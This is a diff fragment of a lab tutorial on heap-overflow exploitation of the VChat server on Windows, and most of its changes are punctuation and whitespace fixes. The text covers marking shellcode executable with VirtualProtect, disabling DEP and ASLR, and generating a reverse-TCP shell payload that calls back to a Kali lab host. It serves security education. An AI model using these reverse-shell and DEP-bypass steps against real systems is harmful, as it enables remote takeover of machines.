 > If you do not disable DEP protections when compiling the program you will notice it crashes when attempting to jump into the shellcode that has been loaded into the data section of the code in the original program.
-> 
+>
 >   <img src="Images/I53.png" width=600>
-> 
+>
 > Due to the addition of the following code in the program we bypass the issues that are caused when DEP is enabled:
 > ```c
-> 	// Mark the shell code as executable 
+> 	// Mark the shell code as executable
 > 	DWORD oldProtect;
 > 	VirtualProtect(SHELL, sizeof(SHELL), PAGE_EXECUTE_READWRITE, &oldProtect);
 > ```
-> * With this we modify the region the shellcode is located in as executable
+> * With this we modify the region the shellcode is located in as executable.
 ## Example Program: Exploit 3, Shell execution (Overwrite function pointer)
 This exploit is based on the previously discussed exploit, however, this time we place function pointers inside of the vectors instead of object pointers. This allows for a more straightforward exploit as we can simply overflow the function pointer directly with the address of the code we would like to execute. Below is a diagram showing the flow of our exploit:
 
@@ -822,7 +815,7 @@ call    ecx                  ; Call the extracted function pointer
 
 ### Exploitation Part 2
 Before executing this we will need to ensure DEP is not enabled on the Windows system.
-1. Open a CMD prompt as an administrator
+1. Open a CMD prompt as an administrator.
 
 2. Run the following command and observe the output, if the output is a `1` or `3` then DEP is enabled and we should disable it on the system to prevent future issues.
     ```
@@ -843,10 +836,10 @@ Now we can start observing the malicious program as it executes!
     * `-a x86`: Generate the shellcode for a x86 32 bit architecture.
     * `--platform Windows`: Generate the shellcode for a Windows machine.
     * `-p `: Payload we are generating shellcode for.
-        * `windows/shell_reverse_tcp`: Reverse TCP payload for Windows
-        * `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7
-        * `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080
-        * `EXITFUNC=process`: Use the process exit function
+        * `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
+        * `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7.
+        * `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
+        * `EXITFUNC=process`: Use the process exit function.
     * `-f c`: Output in a format useable in C code.
     * `-v SHELL`: Specify SHELL as the variable name.
 3. Compile [Exploit2-2.cpp](./SourceCode/Exploit/exploit2-2.cpp) with the following command:
@@ -925,12 +918,12 @@ Now we can start observing the malicious program as it executes!
 
 > [!NOTE]
 > If you do not disable DEP protections when compiling the program you will notice it crashes when attempting to jump into the shellcode that has been loaded into the data section of the code in the original program.
-> 
+>
 >   <img src="Images/I53.png" width=600>
-> 
+>
 > Due to the addition of the following code in the program we bypass the issues that are caused when DEP is enabled:
 > ```c
-> 	// Mark the shell code as executable 
+> 	// Mark the shell code as executable
 > 	DWORD oldProtect;
 > 	VirtualProtect(SHELL, sizeof(SHELL), PAGE_EXECUTE_READWRITE, &oldProtect);
 > ```
@@ -944,15 +937,15 @@ We explore the exploitation of additional functions provided in the VChat server
 
 - If you want to create your own VS project, you need to disable some security related linking flag to ensure exploit2 and exploit3 can succeed. (Project in [SourceCode/VS2019Project](SourceCode/VS2019Project) has been set already.) This can be done in VS IDE:
 
-  Project -> Properties -> Linker -> Set DEP and Randomized Base Address to **No** -> Apply
+  Project -> Properties -> Linker -> Set DEP and Randomized Base Address to **No** -> Apply.
 
 - The SHELLs in exploit2.cpp and exploit3.cpp are reverse shells.
 
 1. [exploit1.cpp](SourceCode/exploit1.py): Information leak.
 2. [exploit2-1.cpp](SourceCode/exploit2-1.py): Code execution I, modify flow of control.
-3. [exploit2-2.cpp](SourceCode/exploit2-2.py): Code execution I, Execute Shell Code. 
+3. [exploit2-2.cpp](SourceCode/exploit2-2.py): Code execution I, Execute Shell Code.
 4. [exploit3.cpp](SourceCode/exploit3-1.py) : Code execution II, modify flow of control.
-5. [exploit3.cpp](SourceCode/exploit3-2.py): Code execution II, Execute Shell Code. 
+5. [exploit3.cpp](SourceCode/exploit3-2.py): Code execution II, Execute Shell Code.
 
 # References
 [1] [Heap Overflow Exploitation on Windows 10 Explained](https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/)
